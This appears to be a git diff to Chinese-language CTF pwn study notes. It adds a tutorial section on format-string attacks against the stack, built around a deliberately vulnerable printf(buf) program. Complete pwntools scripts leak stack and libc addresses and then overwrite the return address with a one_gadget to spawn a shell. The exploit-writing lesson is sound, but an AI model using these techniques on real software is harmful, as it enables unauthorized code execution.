@@ -113,47 +113,53 @@ Table of Contents
     * [实战](#实战-4)
     * [参考](#参考-7)
   * [format string attack stack](#format-string-attack-stack)
+    * [介绍](#介绍-9)
+    * [attack stack](#attack-stack)
+      * [Exploit](#exploit-7)
+      * [Exploit 2](#exploit-2-1)
+    * [实战](#实战-5)
+    * [参考](#参考-8)
   * [format string attack subfunction](#format-string-attack-subfunction)
   * [integer overflow](#integer-overflow)
   * [ropchain](#ropchain)
-    * [介绍](#介绍-9)
+    * [介绍](#介绍-10)
     * [ropchain](#ropchain-1)
       * [ROPgadget](#ropgadget)
-        * [Exploit](#exploit-7)
-      * [Ropper](#ropper)
         * [Exploit](#exploit-8)
-    * [实战](#实战-5)
-    * [参考](#参考-8)
+      * [Ropper](#ropper)
+        * [Exploit](#exploit-9)
+    * [实战](#实战-6)
+    * [参考](#参考-9)
   * [orw shellcode injection](#orw-shellcode-injection)
-    * [介绍](#介绍-10)
+    * [介绍](#介绍-11)
     * [沙盒](#沙盒)
       * [prctl沙盒](#prctl沙盒)
       * [seccomp函数库沙盒](#seccomp函数库沙盒)
     * [open, read, write系统调用](#open-read-write系统调用)
     * [orw shellcode](#orw-shellcode)
-      * [Exploit](#exploit-9)
+      * [Exploit](#exploit-10)
       * [pwntools Exploit](#pwntools-exploit)
     * [拓展 BPF](#拓展-bpf)
-    * [实战](#实战-6)
-    * [参考](#参考-9)
-  * [or shellcode injection](#or-shellcode-injection)
-    * [介绍](#介绍-11)
-    * [cmp与jz](#cmp与jz)
-    * [or shellcode](#or-shellcode)
-      * [Exploit](#exploit-10)
     * [实战](#实战-7)
     * [参考](#参考-10)
-  * [double shellcode injection](#double-shellcode-injection)
-  * [mprotect shellcode injection](#mprotect-shellcode-injection)
+  * [or shellcode injection](#or-shellcode-injection)
     * [介绍](#介绍-12)
-    * [mprotect](#mprotect)
-    * [mprotect shellcode](#mprotect-shellcode)
+    * [cmp与jz](#cmp与jz)
+    * [or shellcode](#or-shellcode)
       * [Exploit](#exploit-11)
     * [实战](#实战-8)
     * [参考](#参考-11)
+  * [double shellcode injection](#double-shellcode-injection)
+  * [mprotect shellcode injection](#mprotect-shellcode-injection)
+    * [介绍](#介绍-13)
+    * [mprotect](#mprotect)
+    * [mprotect shellcode](#mprotect-shellcode)
+      * [Exploit](#exploit-12)
+    * [实战](#实战-9)
+    * [参考](#参考-12)
   * [alphanumeric shellcode injection](#alphanumeric-shellcode-injection)
   * [bypass canary](#bypass-canary)
-    * [介绍](#介绍-13)
+    * [介绍](#介绍-14)
     * [canary保护](#canary保护)
     * [printf leak canary](#printf-leak-canary)
     * [puts leak canary](#puts-leak-canary)
@@ -162,22 +168,22 @@ Table of Contents
     * [SSP leak](#ssp-leak)
     * [劫持\_\_stack\_chk\_fail](#劫持__stack_chk_fail)
     * [利用auxv控制](#利用auxv控制)
-    * [实战](#实战-9)
-    * [参考](#参考-12)
+    * [实战](#实战-10)
+    * [参考](#参考-13)
   * [x86绕过ecx](#x86绕过ecx)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
-    * [介绍](#介绍-14)
-    * [one\_gadget](#one_gadget)
-    * [参考](#参考-13)
-  * [stack migrate](#stack-migrate)
     * [介绍](#介绍-15)
+    * [one\_gadget](#one_gadget)
+    * [参考](#参考-14)
+  * [stack migrate](#stack-migrate)
+    * [介绍](#介绍-16)
     * [leave指令](#leave指令)
     * [栈迁移](#栈迁移)
-      * [Exploit](#exploit-12)
+      * [Exploit](#exploit-13)
     * [栈劫持](#栈劫持)
-    * [实战](#实战-10)
-    * [参考](#参考-14)
+    * [实战](#实战-11)
+    * [参考](#参考-15)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -192,26 +198,26 @@ Table of Contents
   * [realloc trick](#realloc-trick)
   * [setcontext trick](#setcontext-trick)
   * [fix the symbol table](#fix-the-symbol-table)
-    * [介绍](#介绍-16)
+    * [介绍](#介绍-17)
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-15)
+    * [参考](#参考-16)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
-    * [介绍](#介绍-17)
+    * [介绍](#介绍-18)
     * [安装](#安装-1)
     * [使用](#使用)
   * [Ropper](#ropper-1)
-    * [介绍](#介绍-18)
+    * [介绍](#介绍-19)
     * [安装](#安装-2)
     * [使用](#使用-1)
   * [one\_gadget](#one_gadget-1)
-    * [介绍](#介绍-19)
+    * [介绍](#介绍-20)
     * [安装](#安装-3)
     * [使用](#使用-2)
   * [seccomp\-tools](#seccomp-tools)
-    * [介绍](#介绍-20)
+    * [介绍](#介绍-21)
     * [安装](#安装-4)
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
@@ -223,19 +229,19 @@ Table of Contents
   * [pwnable\.tw](#pwnabletw)
     * [start](#start)
       * [分析](#分析-1)
-      * [Exploit](#exploit-13)
+      * [Exploit](#exploit-14)
     * [orw](#orw)
       * [分析](#分析-2)
-      * [Exploit](#exploit-14)
+      * [Exploit](#exploit-15)
     * [CVE\-2018\-1160](#cve-2018-1160)
-      * [参考](#参考-16)
+      * [参考](#参考-17)
     * [calc](#calc)
       * [分析](#分析-3)
     * [dubblesort](#dubblesort)
   * [2021 蓝帽杯](#2021-蓝帽杯)
     * [slient](#slient)
       * [分析](#分析-4)
-      * [Exploit](#exploit-15)
+      * [Exploit](#exploit-16)
   * [2021 长城杯](#2021-长城杯)
     * [K1ng\_in\_h3Ap\_I](#k1ng_in_h3ap_i)
       * [分析](#分析-5)
@@ -2313,6 +2319,191 @@ o.interactive()
 -   https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/
 
 ## format string attack stack
+
+### 介绍
+
+上一篇格式化任意写漏洞更多的是去攻击一些已知的固定的地址, 而栈是不固定的, 所以比上述的要难攻击, 必须要先去泄露栈地址才可以进行
+
+### attack stack
+
+由于栈内的数据偏移量都是固定的, 所以只要泄露出一个栈地址, 就可以推算出其他栈中数据的地址, 如果可以, 直接用格式化任意读就行, 最后就可以覆盖函数返回地址为get shell地址
+
+以一道题来看
+
+```c
+#include<stdio.h>
+#include<string.h>
+#include<unistd.h>
+
+int main() {
+	char buf[0x20];
+	while(1) {
+		read(0, buf, 0x20);
+		if(!strcmp(buf, "Bye\n"))
+			break;
+		printf(buf);
+	}
+	return 0;
+}
+//gcc printf_stack.c -o  printf_stack
+```
+
+这就是个无限格式化字符漏洞利用, 那么第一次可以就用任意读来泄露一个栈地址
+
+![image-20220410224543297](Self-help_Clown.assets/image-20220410224543297.png)
+
+就比如这里这个值就是一个栈地址, 计算偏移量为5个寄存器+5个栈帧=10, %10$p即可leak栈地址
+
+![screenshots](Self-help_Clown.assets/screenshots-16496490403521.gif)
+
+这个地址就是stack地址, 然后我们要计算一下ret函数返回地址和泄露出来的地址的偏移量是多少, 从上面那张图可以看出来, 泄露出来那个栈地址是0xe480, 函数返回地址为0xe3a8, offset = 0xe480 - 0xe3a8 = 216, 所以最终写脚本的时候可以写为
+
+```python
+ret_addr = leak_stack - 216
+```
+
+为了写入方便, 我们这里用格式化字符串漏洞获取shell的话, 最好用one_gadget来完成, 一个地址即可获取shell, 在此之前还需要泄露库函数真实地址, 这里直接任意读读出__libc_start_main, 偏移量为5个寄存器+8个栈帧=13
+
+![screenshots](Self-help_Clown.assets/screenshots-16496494905613.gif)
+
+one_gadget结果为
+
+![screenshots](Self-help_Clown.assets/screenshots-16496497878275.gif)
+
+可以先写一部分脚本了
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+o.interactive()
+```
+
+![image-20220411130941594](Self-help_Clown.assets/image-20220411130941594.png)
+
+可以发现函数返回地址只有最后3个字节和one_gadget不同, 所以任意写的时候, 只要覆写最后三个字节就行
+
+在format string vuln中说过大小控制只有单字节和双字节, 就是没有三字节, 所以要分成两部分来覆盖, 第一部分覆盖最后一个字节, 第二部分覆盖另外两个字节
+
+```python
+part1 = one_gadget & 0xff	# 最后一个字节
+part2 = one_gadget & 0xffffff >> 8	# 另外两个字节
+```
+
+从gdb那张图可以看出buf(也就是填"aaaaaaaa"的地方)偏移量为6, printf是根据\x00截断的, 而p64自动添加\x00, 所以函数返回地址不能填在buf的第一个栈帧, 要往后填, 假设格式化控制符最多占buf两个栈帧, 然后函数返回地址填在buf的第三个栈帧, 也就是%8$n就可以覆盖函数返回地址
+
+```python
+payload = "%{0}p%8$hhn".format(part1)	# 覆盖最后一个字节
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+payload = "%{0}p%8$hn".format(part2)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr+1)	# 覆盖另外两个字节
+o.sendline(payload)
+```
+
+可以先覆盖一个字节来看
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part1 = one_gadget & 0xff
+ret_addr = stack - 216
+payload = "%{0}p%8$hhn".format(part1)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16496549061797.gif)
+
+可以发现最后一个字节已经被覆盖了, 所以按照同样的方法, 覆盖另外两个字节就行
+
+#### Exploit
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part1 = one_gadget & 0xff
+part2 = (one_gadget & 0xffffff) >> 8
+print hex(part1)
+print hex(part2)
+ret_addr = stack - 216
+payload = "%{0}p%8$hhn".format(part1)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+payload = "%{0}p%8$hn".format(part2)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr+1)
+o.sendline(payload)
+o.send("Bye\n\x00")		# strcmp是根据\x00进行截断的, 如果不添加的话, 会比对不成功, 因为在输入的Bye\n后面还有其他内容
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16496557280199.gif)
+
+#### Exploit 2
+
+其实可以一次性就覆盖四个字节来覆盖函数返回地址, 但是printf会打印很多字符需要等一段时间, 而且可能会存在卡死的情况
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part = one_gadget & 0xffffffff
+ret_addr = stack - 216
+payload = "%{0}p%8$n".format(part)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+o.send("Bye\n\x00")		# strcmp是根据\x00进行截断的, 如果不添加的话, 会比对不成功, 因为在输入的Bye\n后面还有其他内容
+o.interactive()
+```
+
+不推荐用这种方法, 我电脑就跑到直接kill进程了
+
+### 实战
+
+
+
+### 参考
 
 
 
